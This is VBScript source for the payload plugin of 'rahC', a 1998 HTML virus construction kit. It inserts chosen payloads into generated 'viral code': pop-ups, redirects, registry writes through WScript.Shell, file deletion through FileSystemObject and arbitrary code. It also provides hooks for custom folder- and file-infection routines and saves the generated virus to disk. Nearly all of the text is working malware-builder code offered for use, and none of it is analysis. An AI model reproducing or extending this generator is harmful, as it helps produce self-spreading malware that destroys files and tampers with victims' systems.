'Default HTML.rahC plugin. ©1nternal 1998

Public const PluginMajorVer = 0
Public const PluginMinorVer = 1
Public const PluginRevision = 0
Public const PluginMajorDesc = "rahC"
Public const PluginMinorDesc = "Defaults"
Public const PluginAuthorDesc = "1nternal"
Public const PluginYearDate = "1998"

Public PluginCopyString

'Simple copyright and information string about the payloads.
PluginCopyString = PluginMajorDesc & "." & PluginMinorDesc & " v" & PluginMajorVer & "." & PluginMinorVer & " Copyright " & PluginYearDate & ". " & PluginAuthorDesc
document.write "<p align=""Center""><font size=""1"" face=""Arial"">Plugin: " & PluginCopyString & "</font></p>"

'Inserts the chosen payload to the viral code text stream
'Simply add more "Case" statements to add your own payloads, or modify existing ones.
'You may reference objects in the form by using the form name "VInfo"
Sub InsertPayload(CheckedOption)
	Select Case CheckedOption
		Case "msgbox"
			AddCodeLine RandString("msgbox" , "window.alert") & RandBrack("""" & VInfo.msgtext.Value & """")
		Case "status"
			AddCodeLine "window.status = """ & VInfo.statbartext.Value & """"
		Case "redirect"
			AddCodeLine RandString("location.replace """ & VInfo.UrlText.Value & """", "location.href = """ & VInfo.UrlText.Value & """")
		Case "regkey"
			if WSCreated <> True then
				AddCodeLine "Set " & VarWSObj & " = CreateObject(""WScript.Shell"")"
			end if
			AddCodeLine VarWSObj & ".Regwrite " & VInfo.regkeytext.Value
		Case "delfile"
			AddCodeLine "Set " & VarFSOObj & " = CreateObject(""Scripting.FileSystemObject"")"
			AddCodeLine VarFSOObj & ".DeleteFile """  & VInfo.DelFileName.Value & """"
		Case "misc"
			AddMultiCodeLine Vinfo.TextData.Value
		Case else
			AddCodeLine "msgbox(""Invalid Payload"")"
	End Select
End Sub

'Custom plugin initialisation routine. Called when "Generate" is executed.
'Useful for customising options. For example randomising certain options or adding a custom header
'Return true to continue, false to halt generation
function InitialisePlugin

    	if EngineMajorVer > 0 or EngineMajorDesc <> "rahC" or EngineMinorDesc <> "VBE" then ErrMsg = chr(13) + chr(10) + "This plugin may not be compatible with this engine"
	InitialisePlugin = confirm("Generate Document?" + Chr(13) + Chr(13) + Chr(10) + "Engine: " + EngineCopyString + Chr(13) + Chr(10) + "Plugin: " + PluginCopyString + Chr(13) + Chr(10) + "GUI: " + GUICopyString + Chr(13) + Chr(10) + ErrMsg)

	'You may change the following to change the default variable names
	'Choosing 'Random variable names' from the GUI will override these defaults
	'Whether a variable is used or not depends on the options and the routines used

	'VarInfFolderName = "InfectFolder"
	'VarHostPath = "HostPath"
	'VarWSObj = "WSHShell"
	'VarFSOObj = "FSO"
	'VarInfPath = "InfectPath"
	'VarInfFileName = "InfectFile"
	'VarInfFile = "InfectFileName"
	'VarFileContents = "FileContents"
	'VarTxtRng = "Rng"
	'VarFolderObj = "FolderObj"
	'VarFileCollection = "fc"
	'VarVictFileObj = "fv"
	'VarTextStreamObj = "ts"
	'VarEachFile = "target"
	'VarTestString = "TestString"
	'VarExtType = "ExtType"

end function

'Useful for doing something else with the generated code when finished
'Return true or false on whether or not to create a document with the generation text (GenText)
function TerminatePlug
		'Examples;
		'msgbox("Lines := " & LinesCount)
		'confirm("Dump to clipboard?")
		'msgbox("Generation complete")
		'Set WinGen = window.open()
		'WinGen.document.write(GenText)

	'These lines are first generation only
	AddLine 0, ""
	AddLine 0, "<!-- snip -->"
	AddLine 0, ""
	AddLine 0, "<html><body>"
	AddLine 0, "<font size=""2"" face=""Arial""><p>"
	AddLine 0, "<strong>HTML.rahC." & VInfo.GenName.Value & " /" & VInfo.IDTag.Value & "</strong>"
	AddLine 0, "</p></font>"
	AddLine 0, "<font size=""1"" face=""Arial""><p>"
	AddLine 0, "Engine: " & EngineCopyString & "<br>"
	AddLine 0, "Plugin: " & PluginCopyString & "<br>"
	AddLine 0, "GUI: " & GUICopyString & "<br>"
	AddLine 0, "</p></font>"
	AddLine 0, "<font size=""1"" face=""Arial""><p>"
	AddLine 0, "Important: Do not edit this document with an HTML editor otherwise it may lose functionality"
	AddLine 0, "</p></font>"
	AddLine 0, "</body></html>"

	TerminatePlug = True
	if location.protocol = "file:" then
		if (msgbox("Would you like to save the generation to a file?" + Chr(13) + Chr(10) + "Note: This cannot be done online. You will need to accept an ActiveX prompt" + Chr(13) + Chr(10) + "Selecting ""No"" will write the generation to a new window.",4,"Save to File?")) = 6 then
			SaveFileN = inputbox("Enter filename:", "Save to file:", VInfo.GenName.Value & ".htm")
			if SaveFileN <> "" then
				Set FSO = CreateObject("Scripting.FileSystemObject")
				HostPath = Replace(location.href, "file:///", "")
				HostPath = Replace(HostPath, "/", "\")
				HostPath = FSO.GetParentFolderName(HostPath)
				Set Fn = FSO.OpenTextFile(HostPath + "\" + SaveFileN, 2, True)
				Fn.Write GenText
				Fn.Close
			end if
			TerminatePlug = False
		end if
	end if
end function

'Called after inserting 'On Error Resume Next'
'If you want to place code before this, go back 20 characters in "GenText"
Sub CustomHeaderCode
	'AddCodeLine "msgbox(""Custom Header Code"")"
End Sub

'Called after inserting the last line of code. Before the copyright text.
Sub CustomFooterCode
	'AddCodeLine "msgbox(""Custom Footer Code"")"
End Sub

'This is called at the end of the conditional execute block
Sub CustomExecuteCodeEnd
	'AddCodeLine "msgbox(""Custom Executable Code"")"
End Sub

'This routine is called if the "Default" routine isn't checked.
'This routine should also check that the file isn't infected before calling the file infection
'Routine.
Sub CustomInfectFolder(CheckedOption)
	Select Case CheckedOption
		Case "CustomA"
			AddCodeLine "msgbox(""CustomA Infect Folder Routine"")"
		Case "CustomB"
			AddCodeLine "msgbox(""CustomB Infect Folder Routine"")"
	End Select
End Sub

'This routine is called if the "Default" routine isn't checked.
'Custom Infect File routine. Normally called by 'InfectFolder'
'The "Sub...End Sub" enclosure is not included
Sub CustomInfectFile(CheckedOption)
	Select Case CheckedOption
		Case "CustomA"
			AddCodeLine "Sub " & VarInfFileName & "(" & VarInfFile & ")"
			TabAmount = TabAmount + 1
				AddCodeLine "msgbox(""CustomA Infect File Routine"")"
			TabAmount = TabAmount - 1
			AddCodeLine "End Sub"	
		Case "CustomB"
			AddCodeLine "Sub " & VarInfFileName & "(" & VarInfFile & ")"
			TabAmount = TabAmount + 1
				AddCodeLine "msgbox(""CustomB Infect File Routine"")"
			TabAmount = TabAmount - 1
			AddCodeLine "End Sub"	
	End Select
End Sub